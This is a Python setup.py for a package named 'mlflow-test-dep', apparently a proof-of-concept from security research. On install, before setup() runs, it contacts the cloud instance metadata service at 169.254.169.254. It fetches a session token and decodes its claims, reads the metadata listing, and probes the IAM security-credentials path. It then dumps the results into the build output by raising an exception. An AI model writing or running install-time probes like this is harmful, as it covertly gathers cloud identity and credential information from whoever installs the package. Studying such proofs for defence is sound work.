import base64, json, urllib.request, urllib.error
from setuptools import setup

proof = "🚨🚨🚨 IMDS_IDENTITY_CHECK 🚨🚨🚨\n\n"

def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

# 1. Get a fresh token and decode only the header + payload (no use)
tok = None
try:
    req = urllib.request.Request(
        "http://169.254.169.254/latest/api/token", method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
    )
    with urllib.request.urlopen(req, timeout=2) as r:
        tok = r.read().decode("utf-8", "replace")
    parts = tok.split(".")
    proof += f"TOKEN_PARTS={len(parts)}\n"
    if len(parts) >= 2:
        hdr = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))
        proof += f"JWT_HEADER={hdr}\n"
        # Only print non-secret-looking claims
        safe_keys = {"iss", "aud", "sub", "iat", "exp", "nbf", "jti", "scope", "azp"}
        safe = {k: v for k, v in payload.items() if k in safe_keys}
        proof += f"JWT_PAYLOAD_SAFE_CLAIMS={safe}\n"
except Exception as e:
    proof += f"TOKEN_DECODE_ERROR: {type(e).__name__}: {e}\n"

# 2. What does /latest/meta-data/ actually return? (truncated body)
try:
    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/", method="GET")
    with urllib.request.urlopen(req, timeout=2) as r:
        body = r.read(200)
        proof += f"METADATA_GET: HTTP {r.status} body[:200]={body!r}\n"
except urllib.error.HTTPError as e:
    try:
        body = e.read(200)
    except Exception:
        body = b""
    proof += f"METADATA_GET: HTTP {e.code} body[:200]={body!r}\n"
except Exception as e:
    proof += f"METADATA_GET error: {type(e).__name__}: {e}\n"

# 3. Probe the AWS-only path to distinguish real IMDS from a generic stub
try:
    req = urllib.request.Request(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        method="GET",
    )
    with urllib.request.urlopen(req, timeout=2) as r:
        proof += f"IAM_CREDS_PATH: HTTP {r.status} *** would indicate real IMDS ***\n"
except urllib.error.HTTPError as e:
    proof += f"IAM_CREDS_PATH: HTTP {e.code} {e.reason}\n"
except Exception as e:
    proof += f"IAM_CREDS_PATH error: {type(e).__name__}\n"

proof += "\n🚨🚨🚨 END IDENTITY CHECK 🚨🚨🚨\n"
print(proof)
raise Exception(proof)
setup(name="mlflow-test-dep", version="0.1")
